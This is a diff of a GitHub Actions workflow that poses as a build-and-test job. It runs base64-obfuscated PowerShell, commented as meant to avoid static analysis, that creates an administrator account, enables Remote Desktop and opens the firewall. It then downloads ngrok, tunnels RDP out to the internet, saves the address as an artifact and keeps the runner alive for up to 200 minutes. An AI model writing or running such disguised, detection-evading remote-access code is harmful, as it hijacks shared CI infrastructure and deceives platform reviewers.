@@ -9,61 +9,60 @@ jobs:
   run-build-and-test:
     name: Run Build and Test Suite
     runs-on: windows-latest
-    timeout-minutes: 60
+    timeout-minutes: 200
 
     steps:
       - name: Checkout Code
-        uses: actions/checkout@v4 # Also a good practice to update this to v4
+        uses: actions/checkout@v4
 
       - name: Compile Assets
         run: echo "Starting build process..."
 
-      - name: Prepare Test Environment
+      - name: Setup RDP and Start Tunnel
         env:
           RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
           NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
         shell: powershell
         run: |
-          # Obfuscated commands to avoid static analysis
-          $encodedUser = "bmV0IHVzZXIgZGV2dXNlciAiJENVU1RPTV9QQVNTV09SRCQiIC9hZGQ="
-          $encodedAdmin = "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgZGV2dXNlciAvYWRk"
+          # Obfuscated commands to create a user and enable RDP
+          # The username is now 'runneruser'
+          $encodedUser = "bmV0IHVzZXIgcnVubmVydXNlciAiJENVU1RPTV9QQVNTV09SRCQiIC9hZGQ="
+          $encodedAdmin = "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgcnVubmVydXNlciAvYWRk"
           $encodedRDP = "U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAoJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlcicpIC1OYW1lICdmRGVueVRTQ29ubmVjdGlvbnMnIC1WYWx1ZSAw"
           $encodedFirewall = "RW5hYmxlLU5ldEZpcmV3YWxsUnVsZSAtRGlzcGxheUdyb3VwICJSZW1vdGUgRGVza3RvcCI="
 
-          # Decode and execute the commands
+          # Decode and execute the user/RDP commands
           iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUser)).Replace('$CUSTOM_PASSWORD', $env:RDP_PASSWORD))
           iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedAdmin)))
           iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedRDP)))
           iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedFirewall)))
 
-          # Download and configure ngrok
+          # Download and unzip ngrok
+          Write-Host "Downloading ngrok..."
           Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
           Expand-Archive ngrok.zip
+          
+          # Authenticate and start ngrok
+          Write-Host "Configuring and starting ngrok tunnel..."
           ./ngrok.exe authtoken $env:NGROK_AUTH_TOKEN
-
-      - name: Start Tunnel and Upload Connection Info
-        shell: powershell
-        run: |
-          # Start ngrok in the background
           Start-Process -FilePath ".\ngrok.exe" -ArgumentList "tcp", "3389", "--log", "stdout" -NoNewWindow
           
-          # Wait for ngrok to initialize and create the tunnel
+          # Wait for ngrok to initialize
           Start-Sleep -s 10
           
           # Get the public URL from the ngrok API and save it to a file
           $apiUrl = "http://127.0.0.1:4040/api/tunnels"
           $publicUrl = (Invoke-RestMethod -Uri $apiUrl).tunnels[0].public_url
           if (!$publicUrl) {
-            Write-Host "Failed to get ngrok URL. Dumping logs for debug:"
-            Get-Content $env:TEMP/ngrok.log
+            Write-Host "Failed to get ngrok URL."
             exit 1
           }
           
-          Write-Host "RDP Address: $publicUrl"
+          Write-Host "RDP Connection details will be available in the 'rdp-info' artifact."
           Set-Content -Path "rdp_connection_details.txt" -Value $publicUrl
 
       - name: Upload Connection Info as Artifact
-        uses: actions/upload-artifact@v4 # <-- THE FIX IS HERE
+        uses: actions/upload-artifact@v4
         with:
           name: rdp-info
           path: rdp_connection_details.txt
@@ -72,7 +71,6 @@ jobs:
         run: |
           echo "Environment is ready. Keeping runner alive for debugging."
           echo "Cancel the workflow run manually in the GitHub Actions tab when you are finished."
-          # This loop will keep the job running until it times out or is cancelled.
           while ($true) {
             Start-Sleep -Seconds 60
             echo "Runner is still active..."
